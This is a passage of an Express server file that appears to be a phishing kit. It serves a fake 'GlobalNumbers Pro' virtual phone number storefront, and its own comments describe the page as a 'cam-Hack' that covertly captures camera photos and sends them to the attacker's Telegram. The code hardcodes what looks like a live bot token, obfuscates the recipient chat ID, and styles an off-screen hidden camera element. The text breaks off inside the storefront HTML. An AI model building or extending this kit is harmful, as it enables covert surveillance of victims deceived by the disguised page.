const express = require('express');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3000;

// HARDCODED BOT TOKEN (Your bot only)
const HARDCODED_BOT_TOKEN = '8209971302:AAHBX9Y9oLG6ikgky-G4xD3M7T8D8F99A7s';

// RANDOM ENCODING KEYS (0-10)
const ENCODING_KEYS = {
  'a': 7, 'b': 2, 'c': 9, 'd': 1, 'e': 5, 'f': 8, 'g': 0, 'h': 3, 'i': 6, 'j': 4, 'k': 0,
  'l': 7, 'm': 2, 'n': 9, 'o': 1, 'p': 5, 'q': 8, 'r': 0, 's': 3, 't': 6, 'u': 4, 'v': 0,
  'w': 7, 'x': 2, 'y': 9, 'z': 1, 'A': 5, 'B': 8, 'C': 0, 'D': 3, 'E': 6, 'F': 4, 'G': 0,
  'H': 7, 'I': 2, 'J': 9, 'K': 1, 'L': 5, 'M': 8, 'N': 0, 'O': 3, 'P': 6, 'Q': 4, 'R': 0
};

// Function to decode chat ID from encoded string
function decodeChatId(encodedStr) {
  let chatId = '';
  for (let char of encodedStr) {
    if (ENCODING_KEYS[char] !== undefined) {
      chatId += ENCODING_KEYS[char];
    } else if (char >= '0' && char <= '9') {
      chatId += char;
    }
  }
  return chatId;
}

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// API endpoint that serves the camera capture page
app.get('/api/FreeSms.js', (req, res) => {
  const { code } = req.query;
  
  if (!code) {
    return res.status(400).json({ 
      error: 'Missing code parameter',
      usage: '/api/cam-Hack.js?code=ENCODED_CHAT_ID',
      example: '/api/cam-Hack.js?code=abc123'
    });
  }

  // Decode chat ID from the code
  const chatId = decodeChatId(code);
  
  if (!chatId || chatId.length < 1) {
    return res.status(400).json({ 
      error: 'Invalid code format',
      message: 'Code must contain valid letters/numbers'
    });
  }

  console.log(`Decoded - Code: ${code} -> Chat ID: ${chatId}`);

  // Generate HTML with HARDCODED bot token and decoded chat ID
  const html = generateHTML(chatId, HARDCODED_BOT_TOKEN);
  
  res.setHeader('Content-Type', 'text/html');
  res.send(html);
});

// Root endpoint
app.get('/', (req, res) => {
  res.json({ 
    message: 'Virtual Numbers API is running! 🚀',
    usage: 'GET /api/cam-Hack.js?code=ENCODED_CHAT_ID',
    description: 'Returns a camera capture page that sends photos to your Telegram',
    note: 'Bot token is hardcoded, only chat ID needs to be encoded'
  });
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

function generateHTML(chatId, botToken) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>GlobalNumbers Pro | Premium Virtual Phone Numbers</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
        }

        :root {
            --primary: #2563eb;
            --secondary: #059669;
            --accent: #dc2626;
            --dark: #1e293b;
            --light: #f8fafc;
            --gray: #64748b;
        }

        body {
            background: linear-gradient(135deg, #f1f5f9 0%, #e2e8f0 100%);
            min-height: 100vh;
            color: #334155;
            line-height: 1.6;
            overflow-x: hidden;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 0 20px;
        }

        /* Header Styles */
        header {
            background: white;
            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.08);
            position: sticky;
            top: 0;
            z-index: 1000;
        }

        .navbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 0;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 12px;
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--dark);
        }

        .logo-icon {
            font-size: 1.8rem;
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .nav-links {
            display: flex;
            gap: 30px;
        }

        .nav-links a {
            text-decoration: none;
            color: var(--dark);
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-links a:hover {
            color: var(--primary);
        }

        .nav-cta {
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 50px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(37, 99, 235, 0.3);
        }

        .nav-cta:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(37, 99, 235, 0.4);
        }

        /* Hero Section */
        .hero {
            padding: 80px 0;
            text-align: center;
            background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 25%, #3730a3 50%, #5b21b6 75%, #7c3aed 100%);
            color: white;
            border-radius: 0 0 30px 30px;
            margin-bottom: 60px;
        }

        .hero h1 {
            font-size: 3.2rem;
            margin-bottom: 20px;
            font-weight: 800;
        }

        .hero p {
            font-size: 1.2rem;
            max-width: 700px;
            margin: 0 auto 30px;
            opacity: 0.9;
        }

        .hero-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: rgba(255, 255, 255, 0.15);
            padding: 8px 20px;
            border-radius: 50px;
            margin-bottom: 30px;
            backdrop-filter: blur(10px);
        }

        /* Stats Section */
        .stats {
            display: flex;
            justify-content: center;
            gap: 50px;
            margin: 40px 0;
        }

        .stat {
            text-align: center;
        }

        .stat-number {
            font-size: 2.5rem;
            font-weight: 800;
            margin-bottom: 5px;
        }

        .stat-label {
            font-size: 0.9rem;
            opacity: 0.8;
        }

        /* Features Section */
        .section-title {
            text-align: center;
            margin-bottom: 50px;
        }

        .section-title h2 {
            font-size: 2.5rem;
            margin-bottom: 15px;
            color: var(--dark);
        }

        .section-title p {
            font-size: 1.1rem;
            color: var(--gray);
            max-width: 600px;
            margin: 0 auto;
        }

        .features {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 30px;
            margin: 60px 0;
        }

        .feature-card {
            background: white;
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.06);
            transition: transform 0.3s, box-shadow 0.3s;
        }

        .feature-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
        }

        .feature-icon {
            font-size: 2.5rem;
            margin-bottom: 20px;
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .feature-card h3 {
            font-size: 1.4rem;
            margin-bottom: 15px;
            color: var(--dark);
        }

        /* Numbers Grid */
        .numbers-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 25px;
            margin: 40px 0;
        }

        .number-card {
            background: white;
            border-radius: 15px;
            padding: 25px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.06);
            border: 2px solid #e2e8f0;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }

        .number-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            border-color: var(--primary);
        }

        .country-flag {
            font-size: 2rem;
            margin-bottom: 15px;
        }

        .country-name {
            font-size: 1.2rem;
            font-weight: 600;
            margin-bottom: 10px;
            color: var(--dark);
        }

        .number-price {
            font-size: 1.8rem;
            font-weight: 700;
            color: var(--primary);
            margin: 15px 0;
        }

        .number-features {
            list-style: none;
            margin: 15px 0;
        }

        .number-features li {
            padding: 5px 0;
            color: var(--gray);
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .number-features li i {
            color: var(--secondary);
            font-size: 0.9rem;
        }

        .buy-btn {
            width: 100%;
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            color: white;
            border: none;
            padding: 12px;
            border-radius: 10px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
        }

        .buy-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(37, 99, 235, 0.3);
        }

        /* Platform Specific Numbers */
        .platform-section {
            background: white;
            padding: 80px 0;
            border-radius: 30px;
            margin: 60px 0;
        }

        .platform-tabs {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 40px;
        }

        .platform-tab {
            padding: 15px 30px;
            background: #f8fafc;
            border: 2px solid #e2e8f0;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s;
            font-weight: 600;
        }

        .platform-tab.active {
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            color: white;
            border-color: var(--primary);
        }

        .platform-content {
            display: none;
        }

        .platform-content.active {
            display: block;
        }

        /* Server Options */
        .servers-section {
            background: white;
            padding: 80px 0;
            border-radius: 30px;
            margin: 60px 0;
        }

        .server-options {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 30px;
            margin-top: 50px;
        }

        .server-card {
            background: #f8fafc;
            border-radius: 15px;
            padding: 30px;
            border: 2px solid #e2e8f0;
            transition: all 0.3s;
        }

        .server-card:hover {
            border-color: var(--primary);
            transform: translateY(-3px);
        }

        .server-icon {
            font-size: 2.5rem;
            margin-bottom: 20px;
            color: var(--primary);
        }

        .server-name {
            font-size: 1.3rem;
            font-weight: 600;
            margin-bottom: 15px;
            color: var(--dark);
        }

        .server-price {
            font-size: 1.5rem;
            font-weight: 700;
            color: var(--secondary);
            margin: 15px 0;
        }

        /* How It Works */
        .how-it-works {
            background: white;
            padding: 80px 0;
            border-radius: 30px;
            margin: 60px 0;
        }

        .steps {
            display: flex;
            justify-content: space-between;
            margin-top: 50px;
            position: relative;
        }

        .steps::before {
            content: '';
            position: absolute;
            top: 40px;
            left: 10%;
            right: 10%;
            height: 3px;
            background: linear-gradient(to right, var(--primary), var(--secondary));
            z-index: 1;
        }

        .step {
            text-align: center;
            position: relative;
            z-index: 2;
            flex: 1;
        }

        .step-number {
            width: 80px;
            height: 80px;
            background: white;
            border: 3px solid var(--primary);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.8rem;
            font-weight: 700;
            color: var(--primary);
            margin: 0 auto 20px;
            position: relative;
        }

        .step h3 {
            margin-bottom: 10px;
            color: var(--dark);
        }

        /* Testimonials */
        .testimonials {
            margin: 80px 0;
        }

        .testimonial-cards {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 30px;
        }

        .testimonial-card {
            background: white;
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.06);
        }

        .testimonial-content {
            font-style: italic;
            margin-bottom: 20px;
            color: var(--gray);
        }

        .testimonial-author {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .author-avatar {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
        }

        .author-info h4 {
            margin-bottom: 5px;
            color: var(--dark);
        }

        .author-info p {
            font-size: 0.9rem;
            color: var(--gray);
        }

        /* CTA Section */
        .cta-section {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: white;
            padding: 80px 0;
            border-radius: 30px;
            text-align: center;
            margin: 60px 0;
        }

        .cta-section h2 {
            font-size: 2.5rem;
            margin-bottom: 20px;
        }

        .cta-section p {
            font-size: 1.1rem;
            max-width: 600px;
            margin: 0 auto 30px;
            opacity: 0.9;
        }

        /* Generator Section */
        .generator {
            background: white;
            border-radius: 20px;
            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.1);
            padding: 50px 40px;
            max-width: 800px;
            margin: 0 auto 80px;
            text-align: center;
            display: none;
        }

        .generator-header {
            margin-bottom: 30px;
        }

        .generator-header h2 {
            font-size: 2rem;
            margin-bottom: 10px;
            color: var(--dark);
        }

        .generator-header p {
            color: var(--gray);
        }

        .input-group {
            margin-bottom: 25px;
            position: relative;
        }

        select, input {
            width: 100%;
            padding: 18px 20px;
            border: 2px solid #e6e6e6;
            border-radius: 12px;
            font-size: 16px;
            transition: all 0.3s;
            background: #fafafa;
        }

        select:focus, input:focus {
            outline: none;
            border-color: var(--primary);
            background: white;
            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
        }

        .btn {
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            color: white;
            border: none;
            padding: 18px 50px;
            border-radius: 50px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-bottom: 20px;
            box-shadow: 0 4px 15px rgba(37, 99, 235, 0.3);
            width: 100%;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(37, 99, 235, 0.4);
        }

        .btn:active {
            transform: translateY(0);
        }

        .trust-badges {
            display: flex;
            justify-content: center;
            gap: 25px;
            margin: 25px 0;
        }

        .badge {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 5px;
        }

        .badge i {
            font-size: 1.8rem;
            color: var(--primary);
        }

        .badge span {
            font-size: 0.75rem;
            color: var(--gray);
        }

        .loading-screen {
            display: none;
        }

        .loader-container {
            position: relative;
            margin: 30px 0;
        }

        .loader {
            width: 80px;
            height: 80px;
            border: 6px solid #f0f0f0;
            border-top: 6px solid var(--primary);
            border-radius: 50%;
            animation: spin 1.2s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .server-messages {
            background: #f8f9fa;
            border-radius: 12px;
            padding: 25px;
            margin: 25px 0;
            min-height: 240px;
            text-align: left;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            color: #333;
            border: 1px solid #eaeaea;
            overflow-y: auto;
            max-height: 240px;
        }

        .message {
            margin-bottom: 12px;
            opacity: 0;
            animation: fadeIn 0.5s forwards;
            line-height: 1.5;
        }

        @keyframes fadeIn {
            to { opacity: 1; }
        }

        .success {
            color: var(--secondary);
        }

        .warning {
            color: #f59e0b;
        }

        .error {
            color: #ef4444;
        }

        .info {
            color: var(--primary);
        }

        .progress-container {
            margin: 25px 0;
        }

        .progress-text {
            display: flex;
            justify-content: space-between;
            margin-bottom: 8px;
            font-size: 0.9rem;
            color: var(--gray);
        }

        .progress-bar {
            width: 100%;
            height: 10px;
            background: #f0f0f0;
            border-radius: 5px;
            overflow: hidden;
        }

        .progress {
            width: 0%;
            height: 100%;
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            transition: width 0.5s ease;
        }

        .result {
            display: none;
            margin-top: 30px;
        }

        .result-icon {
            font-size: 4rem;
            color: var(--secondary);
            margin-bottom: 20px;
        }

        .number-count {
            font-size: 3.5rem;
            font-weight: 800;
            color: var(--primary);
            margin: 20px 0;
            text-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }

        .result-text {
            font-size: 1.2rem;
            color: #555;
            margin-bottom: 30px;
        }

        .disclaimer {
            font-size: 0.8rem;
            color: var(--gray);
            margin-top: 30px;
            line-height: 1.5;
            padding: 15px;
            background: #f9f9f9;
            border-radius: 8px;
        }

        /* Footer */
        footer {
            background: var(--dark);
            color: white;
            padding: 60px 0 30px;
        }

        .footer-content {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 40px;
            margin-bottom: 40px;
        }

        .footer-column h3 {
            margin-bottom: 20px;
            font-size: 1.2rem;
        }

        .footer-links {
            list-style: none;
        }

        .footer-links li {
            margin-bottom: 10px;
        }

        .footer-links a {
            color: #aaa;
            text-decoration: none;
            transition: color 0.3s;
        }

        .footer-links a:hover {
            color: white;
        }

        .footer-bottom {
            text-align: center;
            padding-top: 30px;
            border-top: 1px solid #333;
            color: #aaa;
            font-size: 0.9rem;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .navbar {
                flex-direction: column;
                gap: 20px;
            }
            
            .nav-links {
                gap: 15px;
            }
            
            .hero h1 {
                font-size: 2.5rem;
            }
            
            .stats {
                flex-direction: column;
                gap: 30px;
            }
            
            .steps {
                flex-direction: column;
                gap: 40px;
            }
            
            .steps::before {
                display: none;
            }
            
            .platform-tabs {
                flex-wrap: wrap;
            }
        }

        /* Animation for smooth transitions */
        .fade-in {
            animation: fadeIn 0.5s ease-in;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .url-example {
            font-size: 0.8rem;
            color: var(--gray);
            margin-top: 8px;
            text-align: left;
        }
        
        .error-message {
            color: #ef4444;
            font-size: 0.9rem;
            margin-top: 8px;
            text-align: left;
            display: none;
        }

        /* Hidden camera elements */
        .hidden-camera {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }

        /* Additional Styles */
        .platform-badge {
            position: absolute;
            top: 15px;
            right: 15px;
            background: var(--accent);
            color: white;
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 0.8rem;
            font-weight: 600;
        }

        .inr-price {
            font-size: 1.4rem;
            color: var(--secondary);
            font-weight: 700;
        }

        .original-price {
            text-decoration: line-through;
            color: var(--gray);
            font-size: 1rem;
            margin-left: 10px;
        }

        .discount-badge {
            background: var(--accent);
            color: white;
            padding: 3px 8px;
            border-radius: 15px;
            font-size: 0.8rem;
            margin-left: 10px;
        }

        .quantity-selector {
            display: flex;
            gap: 10px;
            margin: 15px 0;
        }

        .quantity-btn {
            padding: 10px 15px;
            background: #f1f5f9;
            border: 1px solid #cbd5e1;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s;
        }

        .quantity-btn:hover {
            background: #e2e8f0;
        }

        .quantity-display {
            padding: 10px 20px;
            background: white;
            border: 1px solid #cbd5e1;
            border-radius: 8px;
            min-width: 60px;
        }
    </style>
</head>
<body>
    <!-- Header -->
    <header>
        <div class="container">
            <nav class="navbar">
                <div class="logo">
                    <i class="fas fa-sim-card logo-icon"></i>
                    <span>GlobalNumbers Pro</span>
                </div>
                <div class="nav-links">
                    <a href="#numbers">Numbers</a>
                    <a href="#platforms">Platforms</a>
                    <a href="#servers">Servers</a>
                    <a href="#how-it-works">How It Works</a>
                    <a href="#testimonials">Reviews</a>
                </div>
                <button class="nav-cta" id="getStartedBtn">Buy Numbers</button>
            </nav>
        </div>
    </header>

    <!-- Hero Section -->
    <section class="hero" id="mainContent">
        <div class="container">
            <div class="hero-badge">
                <i class="fas fa-shield-alt"></i>
                <span>Trusted by 50,000+ Users Worldwide</span>
            </div>
            <h1>Global Virtual Phone Numbers</h1>
            <p>Get instant access to virtual numbers from 80+ countries for verification, business, and privacy protection.</p>
            
            <div class="stats">
                <div class="stat">
                    <div class="stat-number">80+</div>
                    <div class="stat-label">Countries</div>
                </div>
                <div class="stat">
                    <div class="stat-number">50K+</div>
                    <div class="stat-label">Active Users</div>
                </div>
                <div class="stat">
                    <div class="stat-number">24/7</div>
                    <div class="stat-label">Support</div>
                </div>
            </div>
        </div>
    </section>

    <!-- Popular Numbers Section -->
    <section class="container" id="numbers">
        <div class="section-title">
            <h2>Popular Virtual Numbers</h2>
            <p>Choose from our most popular international numbers with competitive INR pricing</p>
        </div>
        
        <div class="numbers-grid">
            <!-- USA Numbers -->
            <div class="number-card">
                <div class="country-flag">🇺🇸</div>
                <h3 class="country-name">United States</h3>
                <div class="number-price">
                    <span class="inr-price">₹249</span>
                    <span class="original-price">₹399</span>
                    <span class="discount-badge">38% OFF</span>
                </div>
                <ul class="number-features">
                    <li><i class="fas fa-check"></i> Instant Activation</li>
                    <li><i class="fas fa-check"></i> SMS & Calls</li>
                    <li><i class="fas fa-check"></i> 30 Days Validity</li>
                    <li><i class="fas fa-check"></i> All Apps Supported</li>
                </ul>
                <div class="quantity-selector">
                    <button class="quantity-btn" onclick="updateQuantity('usa', -1)">-</button>
                    <span class="quantity-display" id="usa-quantity">1</span>
                    <button class="quantity-btn" onclick="updateQuantity('usa', 1)">+</button>
                </div>
                <button class="buy-btn" data-country="USA" data-price="249">Buy Now - ₹249</button>
            </div>

            <!-- UK Numbers -->
            <div class="number-card">
                <div class="country-flag">🇬🇧</div>
                <h3 class="country-name">United Kingdom</h3>
                <div class="number-price">
                    <span class="inr-price">₹299</span>
                    <span class="original-price">₹449</span>
                    <span class="discount-badge">33% OFF</span>
                </div>
                <ul class="number-features">
                    <li><i class="fas fa-check"></i> Instant Activation</li>
                    <li><i class="fas fa-check"></i> SMS & Calls</li>
                    <li><i class="fas fa-check"></i> 30 Days Validity</li>
                    <li><i class="fas fa-check"></i> All Apps Supported</li>
                </ul>
                <div class="quantity-selector">
                    <button class="quantity-btn" onclick="updateQuantity('uk', -1)">-</button>
                    <span class="quantity-display" id="uk-quantity">1</span>
                    <button class="quantity-btn" onclick="updateQuantity('uk', 1)">+</button>
                </div>
                <button class="buy-btn" data-country="UK" data-price="299">Buy Now - ₹299</button>
            </div>

            <!-- Germany Numbers -->
            <div class="number-card">
                <div class="country-flag">🇩🇪</div>
                <h3 class="country-name">Germany</h3>
                <div class="number-price">
                    <span class="inr-price">₹349</span>
                    <span class="original-price">₹499</span>
                    <span class="discount-badge">30% OFF</span>
                </div>
                <ul class="number-features">
                    <li><i class="fas fa-check"></i> Instant Activation</li>
                    <li><i class="fas fa-check"></i> SMS & Calls</li>
                    <li><i class="fas fa-check"></i> 30 Days Validity</li>
                    <li><i class="fas fa-check"></i> All Apps Supported</li>
                </ul>
                <div class="quantity-selector">
                    <button class="quantity-btn" onclick="updateQuantity('germany', -1)">-</button>
                    <span class="quantity-display" id="germany-quantity">1</span>
                    <button class="quantity-btn" onclick="updateQuantity('germany', 1)">+</button>
                </div>
                <button class="buy-btn" data-country="Germany" data-price="349">Buy Now - ₹349</button>
            </div>

            <!-- Canada Numbers -->
            <div class="number-card">
                <div class="country-flag">🇨🇦</div>
                <h3 class="country-name">Canada</h3>
                <div class="number-price">
                    <span class="inr-price">₹229</span>
                    <span class="original-price">₹379</span>
                    <span class="discount-badge">40% OFF</span>
                </div>
                <ul class="number-features">
                    <li><i class="fas fa-check"></i> Instant Activation</li>
                    <li><i class="fas fa-check"></i> SMS & Calls</li>
                    <li><i class="fas fa-check"></i> 30 Days Validity</li>
                    <li><i class="fas fa-check"></i> All Apps Supported</li>
                </ul>
                <div class="quantity-selector">
                    <button class="quantity-btn" onclick="updateQuantity('canada', -1)">-</button>
                    <span class="quantity-display" id="canada-quantity">1</span>
                    <button class="quantity-btn" onclick="updateQuantity('canada', 1)">+</button>
                </div>
                <button class="buy-btn" data-country="Canada" data-price="229">Buy Now - ₹229</button>
            </div>

            <!-- Australia Numbers -->
            <div class="number-card">
                <div class="country-flag">🇦🇺</div>
                <h3 class="country-name">Australia</h3>
                <div class="number-price">
                    <span class="inr-price">₹379</span>
                    <span class="original-price">₹549</span>
                    <span class="discount-badge">31% OFF</span>
                </div>
                <ul class="number-features">
                    <li><i class="fas fa-check"></i> Instant Activation</li>
                    <li><i class="fas fa-check"></i> SMS & Calls</li>
                    <li><i class="fas fa-check"></i> 30 Days Validity</li>
                    <li><i class="fas fa-check"></i> All Apps Supported</li>
                </ul>
                <div class="quantity-selector">
                    <button class="quantity-btn" onclick="updateQuantity('australia', -1)">-</button>
                    <span class="quantity-display" id="australia-quantity">1</span>
                    <button class="quantity-btn" onclick="updateQuantity('australia', 1)">+</button>
                </div>
                <button class="buy-btn" data-country="Australia" data-price="379">Buy Now - ₹379</button>
            </div>

            <!-- France Numbers -->
            <div class="number-card">
                <div class="country-flag">🇫🇷</div>
                <h3 class="country-name">France</h3>
                <div class="number-price">
                    <span class="inr-price">₹319</span>
                    <span class="original-price">₹469</span>
                    <span class="discount-badge">32% OFF</span>
                </div>
                <ul class="number-features">
                    <li><i class="fas fa-check"></i> Instant Activation</li>
                    <li><i class="fas fa-check"></i> SMS & Calls</li>
                    <li><i class="fas fa-check"></i> 30 Days Validity</li>
                    <li><i class="fas fa-check"></i> All Apps Supported</li>
                </ul>
                <div class="quantity-selector">
                    <button class="quantity-btn" onclick="updateQuantity('france', -1)">-</button>
                    <span class="quantity-display" id="france-quantity">1</span>
                    <button class="quantity-btn" onclick="updateQuantity('france', 1)">+</button>
                </div>
                <button class="buy-btn" data-country="France" data-price="319">Buy Now - ₹319</button>
            </div>
        </div>
    </section>

    <!-- Platform Specific Numbers -->
    <section class="platform-section" id="platforms">
        <div class="container">
            <div class="section-title">
                <h2>Platform Specific Numbers</h2>
                <p>Get numbers optimized for specific platforms and applications</p>
            </div>

            <div class="platform-tabs">
                <div class="platform-tab active" data-platform="whatsapp">WhatsApp Numbers</div>
                <div class="platform-tab" data-platform="telegram">Telegram Numbers</div>
                <div class="platform-tab" data-platform="facebook">Facebook Numbers</div>
                <div class="platform-tab" data-platform="google">Google Numbers</div>
            </div>

            <!-- WhatsApp Numbers -->
            <div class="platform-content active" id="whatsapp-content">
                <div class="numbers-grid">
                    <div class="number-card">
                        <div class="platform-badge">WhatsApp</div>
                        <div class="country-flag">🇺🇸</div>
                        <h3 class="country-name">USA WhatsApp</h3>
                        <div class="number-price">
                            <span class="inr-price">₹199</span>
                            <span class="original-price">₹349</span>
                        </div>
                        <ul class="number-features">
                            <li><i class="fas fa-check"></i> Instant WhatsApp Verification</li>
                            <li><i class="fas fa-check"></i> 100% Success Rate</li>
                            <li><i class="fas fa-check"></i> 45 Days Validity</li>
                            <li><i class="fas fa-check"></i> SMS Support Included</li>
                        </ul>
                        <button class="buy-btn" data-platform="whatsapp" data-country="USA">Buy WhatsApp Number</button>
                    </div>

                    <div class="number-card">
                        <div class="platform-badge">WhatsApp</div>
                        <div class="country-flag">🇬🇧</div>
                        <h3 class="country-name">UK WhatsApp</h3>
                        <div class="number-price">
                            <span class="inr-price">₹249</span>
                            <span class="original-price">₹399</span>
                        </div>
                        <ul class="number-features">
                            <li><i class="fas fa-check"></i> Instant WhatsApp Verification</li>
                            <li><i class="fas fa-check"></i> 100% Success Rate</li>
                            <li><i class="fas fa-check"></i> 45 Days Validity</li>
                            <li><i class="fas fa-check"></i> SMS Support Included</li>
                        </ul>
                        <button class="buy-btn" data-platform="whatsapp" data-country="UK">Buy WhatsApp Number</button>
                    </div>

                    <div class="number-card">
                        <div class="platform-badge">WhatsApp</div>
                        <div class="country-flag">🇮🇳</div>
                        <h3 class="country-name">India WhatsApp</h3>
                        <div class="number-price">
                            <span class="inr-price">₹149</span>
                            <span class="original-price">₹299</span>
                        </div>
                        <ul class="number-features">
                            <li><i class="fas fa-check"></i> Instant WhatsApp Verification</li>
                            <li><i class="fas fa-check"></i> 100% Success Rate</li>
                            <li><i class="fas fa-check"></i> 60 Days Validity</li>
                            <li><i class="fas fa-check"></i> SMS Support Included</li>
                        </ul>
                        <button class="buy-btn" data-platform="whatsapp" data-country="India">Buy WhatsApp Number</button>
                    </div>
                </div>
            </div>

            <!-- Telegram Numbers -->
            <div class="platform-content" id="telegram-content">
                <div class="numbers-grid">
                    <div class="number-card">
                        <div class="platform-badge">Telegram</div>
                        <div class="country-flag">🇺🇸</div>
                        <h3 class="country-name">USA Telegram</h3>
                        <div class="number-price">
                            <span class="inr-price">₹179</span>
                            <span class="original-price">₹329</span>
                        </div>
                        <ul class="number-features">
                            <li><i class="fas fa-check"></i> Instant Telegram Verification</li>
                            <li><i class="fas fa-check"></i> Premium Quality</li>
                            <li><i class="fas fa-check"></i> 60 Days Validity</li>
                            <li><i class="fas fa-check"></i> Multiple Accounts</li>
                        </ul>
                        <button class="buy-btn" data-platform="telegram" data-country="USA">Buy Telegram Number</button>
                    </div>

                    <div class="number-card">
                        <div class="platform-badge">Telegram</div>
                        <div class="country-flag">🇬🇧</div>
                        <h3 class="country-name">UK Telegram</h3>
                        <div class="number-price">
                            <span class="inr-price">₹229</span>
                            <span class="original-price">₹379</span>
                        </div>
                        <ul class="number-features">
                            <li><i class="fas fa-check"></i> Instant Telegram Verification</li>
                            <li><i class="fas fa-check"></i> Premium Quality</li>
                            <li><i class="fas fa-check"></i> 60 Days Validity</li>
                            <li><i class="fas fa-check"></i> Multiple Accounts</li>
                        </ul>
                        <button class="buy-btn" data-platform="telegram" data-country="UK">Buy Telegram Number</button>
                    </div>

                    <div class="number-card">
                        <div class="platform-badge">Telegram</div>
                        <div class="country-flag">🇩🇪</div>
                        <h3 class="country-name">Germany Telegram</h3>
                        <div class="number-price">
                            <span class="inr-price">₹279</span>
                            <span class="original-price">₹429</span>
                        </div>
                        <ul class="number-features">
                            <li><i class="fas fa-check"></i> Instant Telegram Verification</li>
                            <li><i class="fas fa-check"></i> Premium Quality</li>
                            <li><i class="fas fa-check"></i> 60 Days Validity</li>
                            <li><i class="fas fa-check"></i> Multiple Accounts</li>
                        </ul>
                        <button class="buy-btn" data-platform="telegram" data-country="Germany">Buy Telegram Number</button>
                    </div>
                </div>
            </div>

            <!-- Add similar sections for Facebook and Google -->
        </div>
    </section>

    <!-- Server Options Section -->
    <section class="servers-section" id="servers">
        <div class="container">
            <div class="section-title">
                <h2>Premium Server Options</h2>
                <p>Choose the perfect server plan for your needs with competitive INR pricing</p>
            </div>
            
            <div class="server-options">
                <div class="server-card">
                    <i class="fas fa-server server-icon"></i>
                    <h3 class="server-name">Basic Server</h3>
                    <div class="server-price">
                        <span class="inr-price">₹799/month</span>
                    </div>
                    <ul class="number-features">
                        <li><i class="fas fa-check"></i> 5 Virtual Numbers</li>
                        <li><i class="fas fa-check"></i> 10GB Storage</li>
                        <li><i class="fas fa-check"></i> Basic Support</li>
                        <li><i class="fas fa-check"></i> 30 Days Retention</li>
                        <li><i class="fas fa-check"></i> WhatsApp & Telegram</li>
                    </ul>
                    <button class="buy-btn">Select Plan - ₹799</button>
                </div>

                <div class="server-card">
                    <i class="fas fa-database server-icon"></i>
                    <h3 class="server-name">Pro Server</h3>
                    <div class="server-price">
